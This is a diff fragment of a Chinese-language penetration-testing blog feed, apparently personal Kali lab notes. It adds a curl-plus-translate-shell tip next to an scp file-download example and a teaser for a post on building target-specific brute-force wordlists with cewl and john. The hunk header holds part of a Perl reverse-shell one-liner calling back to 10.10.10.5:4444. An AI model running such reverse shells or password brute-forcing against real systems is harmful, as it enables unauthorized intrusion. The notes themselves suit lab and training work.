@@ -1346,7 +1346,11 @@ perl -e &#39;use Socket;$i=&#34;10.10.10.5&#34;;$p=4444;socket(S,PF_INET,SOCK_ST
 <p>以下面这个命令为例，将 ssh 用户 erso 的 /bin/dartVader 文件下载到当前目录，指定 ssh 端口位 10110。</p>
 <pre tabindex="0"><code>┌──(kali㉿kali)-[~/Work/Kali]
 └─$ scp -P 10110 -q erso@10.110.10.45:/bin/dartVader .
-</code></pre><blockquote>
+</code></pre><h3 id="使用-curl-将返回的内容输出为中文">使用 curl 将返回的内容输出为中文</h3>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/Work/Kali]
+└─$ curl -s http://10.10.10.45/secret | trans -b :zh
+</code></pre><p>trans（translate-shell）是很不错的命令行翻译工具。</p>
+<blockquote>
 <p>本文章持续更新中</p>
 </blockquote>
 ]]></content></item><item><title>如何根据具体的目标定制字典</title><link>https://enilmalus.github.io/posts/%E5%A6%82%E4%BD%95%E6%A0%B9%E6%8D%AE%E5%85%B7%E4%BD%93%E7%9A%84%E7%9B%AE%E6%A0%87%E5%AE%9A%E5%88%B6%E5%AD%97%E5%85%B8/</link><pubDate>Thu, 09 Oct 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/%E5%A6%82%E4%BD%95%E6%A0%B9%E6%8D%AE%E5%85%B7%E4%BD%93%E7%9A%84%E7%9B%AE%E6%A0%87%E5%AE%9A%E5%88%B6%E5%AD%97%E5%85%B8/</guid><description>&lt;p&gt;在遇到目标网站且使用 &lt;em&gt;kali&lt;/em&gt; 默认的 &lt;em&gt;rockyou&lt;/em&gt; 字典爆破时间过长时可以尝试通过 &lt;em&gt;cewl&lt;/em&gt; 与 &lt;em&gt;john&lt;/em&gt; 结合生成目标定制的字典缩短爆破时间。&lt;/p&gt;
